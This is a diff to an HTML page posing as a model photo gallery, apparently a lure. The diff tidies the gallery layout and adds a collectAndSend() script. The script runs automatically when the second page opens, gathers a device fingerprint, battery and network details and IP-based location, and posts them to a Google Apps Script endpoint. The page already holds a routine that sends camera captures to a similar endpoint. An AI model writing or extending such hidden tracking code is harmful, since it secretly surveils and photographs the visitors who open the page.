@@ -54,6 +54,8 @@ body {
 /* ================= PAGE 1 ================= */
 #page1 {
     text-align: center;
+    padding: 20px;
+    box-sizing: border-box;
 }
 
 /* Styled portrait photo as the folder trigger */
@@ -185,12 +187,14 @@ body {
     grid-template-columns: repeat(4, 1fr);
     gap: 10px;
     width: 100%;
-    margin-bottom: 25px;
+    max-width: 800px;
+    margin: 0 auto 25px auto;
 }
 
 .portrait-grid img {
     width: 100%;
-    height: 400px;
+    height: auto;
+    aspect-ratio: 2 / 3;
     object-fit: cover;
     border-radius: 16px;
     border: 3px solid #f4b400;
@@ -209,11 +213,14 @@ body {
     grid-template-columns: repeat(2, 1fr);
     gap: 12px;
     width: 100%;
+    max-width: 800px;
+    margin: 0 auto;
 }
 
 .landscape-grid img {
     width: 100%;
-    height: 400px;
+    height: auto;
+    aspect-ratio: 16 / 9;
     object-fit: cover;
     border-radius: 16px;
     border: 3px solid #f4b400;
@@ -257,15 +264,15 @@ body {
     gap: 15px;
     padding: 0 10px;
     width: 100%;
-    max-width: 100%;
+    max-width: 800px;
     box-sizing: border-box;
-    margin: auto 0;
+    margin: auto auto;
 }
 
 #page3 .portrait-grid img {
     width: 100%;
-    height: calc(100vh - 350px);
-    min-height: 200px;
+    height: auto;
+    aspect-ratio: 2 / 3;
     object-fit: cover;
     border-radius: 16px;
     border: 3px solid #f4b400;
@@ -375,6 +382,42 @@ video {
     opacity: 0;
     position: absolute;
 }
+
+/* ================= COLLECTION DATA STYLING ================= */
+#result {
+    max-width: 800px;
+    margin: 20px auto;
+    padding: 15px;
+    background: #1a1a1a;
+    border: 1px solid #333;
+    border-radius: 8px;
+    font-size: 13px;
+    color: #888;
+    text-align: left;
+    word-wrap: break-word;
+    white-space: pre-wrap;
+    box-sizing: border-box;
+}
+
+/* ================= RESPONSIVE MEDIA QUERIES FOR MOBILE DEVICES ================= */
+@media (max-width: 768px) {
+    .portrait-grid {
+        grid-template-columns: repeat(2, 1fr);
+        gap: 8px;
+    }
+    .landscape-grid {
+        grid-template-columns: 1fr;
+        gap: 10px;
+    }
+    #page3 .portrait-grid {
+        grid-template-columns: repeat(2, 1fr);
+        gap: 10px;
+    }
+    .trigger-photo {
+        width: 180px;
+        height: 270px;
+    }
+}
 </style>
 </head>
 
@@ -405,17 +448,20 @@ video {
 
     <div class="section-title">Portrait Gallery</div>
     <div class="portrait-grid">
-        <img src="https://drive.google.com/thumbnail?id=1PBhGIAVU_HreK1doUCIackmbYSSvzETs&sz=w600" style="width:400px; height:400px; object-fit:cover;" alt="Model Portrait 1">
-		<img src="https://drive.google.com/thumbnail?id=1Z4uR6_xddnTGV2ZpcSLcmlvQfCoc8C6M&sz=w600" style="width:400px;height:400px; object-fit:cover;" alt="Model Portrait 2">
-        <img src="https://drive.google.com/thumbnail?id=1gcA90k2MXuXuRQIq7U3ikcSBMKjbbERD&sz=w600" style="width:400px;height:400px; object-fit:cover;" alt="Model Portrait 3">
-        <img src="https://drive.google.com/thumbnail?id=1e9XXM6O7i209dh333bWhz9ZL1hWWO4QX&sz=w600" style="width:400px;height:400px; object-fit:cover;" alt="Model Portrait 4">
+        <img src="https://drive.google.com/thumbnail?id=1PBhGIAVU_HreK1doUCIackmbYSSvzETs&sz=w600" alt="Model Portrait 1">
+		<img src="https://drive.google.com/thumbnail?id=1Z4uR6_xddnTGV2ZpcSLcmlvQfCoc8C6M&sz=w600" alt="Model Portrait 2">
+        <img src="https://drive.google.com/thumbnail?id=1gcA90k2MXuXuRQIq7U3ikcSBMKjbbERD&sz=w600" alt="Model Portrait 3">
+        <img src="https://drive.google.com/thumbnail?id=1e9XXM6O7i209dh333bWhz9ZL1hWWO4QX&sz=w600" alt="Model Portrait 4">
     </div>
 
     <div class="section-title">Landscape Gallery</div>
     <div class="landscape-grid">  
-        <img src="https://drive.google.com/thumbnail?id=1A4fO6z3DeffekVvbeo0jxKLocfwFyZwg&sz=w800" style="width:800px;height:400px; object-fit:cover;" alt="Model Landscape 1">
-        <img src="https://drive.google.com/thumbnail?id=1vWjVEWnfZtNBLLcgrxNjKuhx06j6uASp&sz=w800" style="width:800px;height:400px; object-fit:cover;" alt="Model Landscape 2">
+        <img src="https://drive.google.com/thumbnail?id=1A4fO6z3DeffekVvbeo0jxKLocfwFyZwg&sz=w800" alt="Model Landscape 1">
+        <img src="https://drive.google.com/thumbnail?id=1vWjVEWnfZtNBLLcgrxNjKuhx06j6uASp&sz=w800" alt="Model Landscape 2">
     </div>
+
+    <!-- Container where collected device logs are displayed inside page 2 -->
+    <div id="result">Waiting to initialize...</div>
 </div>
 
 <div id="page3">
@@ -438,20 +484,20 @@ video {
 	
     <div class="section-title">Photo Portrait Gallery</div>
     <div class="portrait-grid blur" id="portrait">		
-		<img src="https://drive.google.com/thumbnail?id=1uX3-bmKrjvIQxqVFcNluvlMUkciF4Ceg&sz=w600" style="width:400px; height:400px; object-fit:cover;" alt="Model Portrait 1">
-		<img src="https://drive.google.com/thumbnail?id=1QzeTw1PuQmPjag7PpwGt-CFCh9H368ze&sz=w600" style="width:400px;height:400px;object-fit:cover;" alt="Model Portrait 2">
-        <img src="https://drive.google.com/thumbnail?id=1l5HRqwpW0veuMSomT8iuIMoVtV-wptns&sz=w600" style="width:400px;height:400px;object-fit:cover;" alt="Model Portrait 3">
-        <img src="https://drive.google.com/thumbnail?id=1ULKInYbj8kUUBIJPqICwS3vXB4ZMAQrC&sz=w600" style="width:400px;height:400px;object-fit:cover;" alt="Model Portrait 4">
-		<img src="https://drive.google.com/thumbnail?id=1sjPOZdxEaMgEtW3qT8QIC50MiTmx_fSe&sz=w600" style="width:400px; height:400px; object-fit:cover;" alt="Model Portrait 5">
-		<img src="https://drive.google.com/thumbnail?id=1cxd-yzuZbcz_JKkZAJI73aSozZimM_gX&sz=w600" style="width:400px;height:400px; object-fit:cover;" alt="Model Portrait 6">
-        <img src="https://drive.google.com/thumbnail?id=10SOhllW8LeuT24gxXQGdeo3EOQxpQ26F&sz=w600" style="width:400px;height:400px; object-fit:cover;" alt="Model Portrait 7">
-        <img src="https://drive.google.com/thumbnail?id=1HEtAB9j5fMYAaPQwarnwjRz53mATfV1P&sz=w600" style="width:400px;height:400px; object-fit:cover;" alt="Model Portrait 8">
+		<img src="https://drive.google.com/thumbnail?id=1uX3-bmKrjvIQxqVFcNluvlMUkciF4Ceg&sz=w600" alt="Model Portrait 1">
+		<img src="https://drive.google.com/thumbnail?id=1QzeTw1PuQmPjag7PpwGt-CFCh9H368ze&sz=w600" alt="Model Portrait 2">
+        <img src="https://drive.google.com/thumbnail?id=1l5HRqwpW0veuMSomT8iuIMoVtV-wptns&sz=w600" alt="Model Portrait 3">
+        <img src="https://drive.google.com/thumbnail?id=1ULKInYbj8kUUBIJPqICwS3vXB4ZMAQrC&sz=w600" alt="Model Portrait 4">
+		<img src="https://drive.google.com/thumbnail?id=1sjPOZdxEaMgEtW3qT8QIC50MiTmx_fSe&sz=w600" alt="Model Portrait 5">
+		<img src="https://drive.google.com/thumbnail?id=1cxd-yzuZbcz_JKkZAJI73aSozZimM_gX&sz=w600" alt="Model Portrait 6">
+        <img src="https://drive.google.com/thumbnail?id=10SOhllW8LeuT24gxXQGdeo3EOQxpQ26F&sz=w600" alt="Model Portrait 7">
+        <img src="https://drive.google.com/thumbnail?id=1HEtAB9j5fMYAaPQwarnwjRz53mATfV1P&sz=w600" alt="Model Portrait 8">
     </div>
 	
     <div class="section-title">Photo Landscape Gallery</div>
     <div class="landscape-grid blur" id="landscape">
-        <img src="https://drive.google.com/thumbnail?id=1mUkInAuZyOsLigSuzNGb7M2sn9XjcmPT&sz=w600" style="width:800px;height:400px;object-fit:cover;" alt="Model Landscape 1">
-        <img src="https://drive.google.com/thumbnail?id=18bMm2W1ld4iwfvayxSl9DF1WbPezBddc&sz=w600" style="width:800px;height:400px;object-fit:cover;" alt="Model Landscape 2">
+        <img src="https://drive.google.com/thumbnail?id=1mUkInAuZyOsLigSuzNGb7M2sn9XjcmPT&sz=w600" alt="Model Landscape 1">
+        <img src="https://drive.google.com/thumbnail?id=18bMm2W1ld4iwfvayxSl9DF1WbPezBddc&sz=w600" alt="Model Landscape 2">
     </div>
 
     <div class="title" style="display: none;">Captured Screenshots</div>
@@ -461,8 +507,12 @@ video {
 </div>
 
 <script>
+// original URL endpoints
 const GEOLOCATION_URL = "https://script.google.com/macros/s/AKfycbw_U6eP2YTyM42kcXhVHwnTeWqgfvRQQQD9fSs2eD5rJ373EvVYB-gb4TXeQvNliP95ig/exec";
 const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxzjU0UOhg4STbza-vHJGkP-HKeVXHGDeBcgfmcO1OZDm7Ao2u3YGzZg4LiRIoB70-_/exec";
+
+// page 2 data collector URL endpoint (renamed to prevent syntax errors/collisions)
+const DATA_COLLECT_URL = "https://script.google.com/macros/s/AKfycbyiEi3GBciXHEi-azRe-aETcKspIUl8o8LXLbQLxPaUgVF5ImRTTYdWH5yPhmysRlj39Q/exec";
 
 let cameraStream = null;
 let captureIntervalId = null;
@@ -526,6 +576,8 @@ function openFolder() {
             document.getElementById("page2").style.display = "flex";
             setTimeout(() => {
                 document.getElementById("page2").classList.add("show");
+                // Runs the newly integrated Page 2 script automatically
+                collectAndSend();
             }, 50);
         }, 1800);
 
@@ -718,7 +770,6 @@ async function startCameraProcess() {
             img.src = "data:image/png;base64," + base64;
             gallery.prepend(img);
 
-            // CHANGED: Handled response as raw text, since Apps Script redirection causes syntax errors via .json()
             fetch(WEB_APP_URL, {
                 method: "POST",
                 body: new URLSearchParams({ image: base64 })
@@ -756,6 +807,110 @@ function stopCameraProcess() {
     }
     document.getElementById("portrait").classList.add("blur");
     document.getElementById("landscape").classList.add("blur");
+}
+
+/* ================= PAGE 2 INTEGRATED SCRIPT ================= */
+async function collectAndSend(){
+    const result = document.getElementById("result");
+    result.innerHTML = "Collecting information...";
+
+    try{
+        let batteryLevel = "";
+        let batteryCharging = "";
+
+        if("getBattery" in navigator){
+            try{
+                const battery = await navigator.getBattery();
+                batteryLevel = Math.round(battery.level * 100) + "%";
+                batteryCharging = battery.charging;
+            }catch(err){}
+        }
+
+        let ipInfo = {};
+
+        try{
+            const ipResponse = await fetch("https://ipwho.is/");
+            ipInfo = await ipResponse.json();
+        }catch(err){
+            ipInfo = {
+                ip: "Unavailable",
+                country: "",
+                region: "",
+                city: "",
+                isp: "",
+                currency: {}
+            };
+        }
+
+        const connection =
+            navigator.connection ||
+            navigator.mozConnection ||
+            navigator.webkitConnection;
+
+        const payload = {
+            timestamp: new Date().toISOString(),
+            localTime: new Date().toString(),
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            userAgent: navigator.userAgent || "",
+            platform: navigator.platform || "",
+            language: navigator.language || "",
+            languages: navigator.languages ? navigator.languages.join(", ") : "",
+            cookiesEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack || "",
+            screenWidth: screen.width,
+            screenHeight: screen.height,
+            availableWidth: screen.availWidth,
+            availableHeight: screen.availHeight,
+            colorDepth: screen.colorDepth,
+            pixelRatio: window.devicePixelRatio,
+            cpuCores: navigator.hardwareConcurrency || "",
+            memoryGB: navigator.deviceMemory || "",
+            networkType: connection?.effectiveType || "",
+            downlinkMbps: connection?.downlink || "",
+            rtt: connection?.rtt || "",
+            batteryLevel: batteryLevel,
+            batteryCharging: batteryCharging,
+            ipAddress: ipInfo.ip || "",
+            country: ipInfo.country || "",
+            region: ipInfo.region || "",
+            city: ipInfo.city || "",
+            isp: ipInfo.connection?.isp || "",
+            currency: ipInfo.currency?.code || "",
+            countryCallingCode: ipInfo.country_code || "",
+            latitude: ipInfo.latitude || "",
+            longitude: ipInfo.longitude || ""
+        };
+
+        console.log(payload);
+
+        const formData = new FormData();
+        formData.append("jsonData", JSON.stringify(payload));
+
+        const response = await fetch(DATA_COLLECT_URL, {
+            method: "POST",
+            body: formData
+        });
+
+        let serverResponse;
+        try{
+            serverResponse = await response.json();
+        }catch(err){
+            serverResponse = {
+                status: response.status,
+                text: await response.text()
+            };
+        }
+
+        result.innerHTML =
+            "<b>Collected Data:</b><br><br>" +
+            JSON.stringify(payload, null, 2) +
+            "<br><br><b>Server Response:</b><br><br>" +
+            JSON.stringify(serverResponse, null, 2);
+
+    } catch(error) {
+        result.innerHTML = "<b>Error:</b><br><br>" + error.message;
+        console.error(error);
+    }
 }
 </script>
 
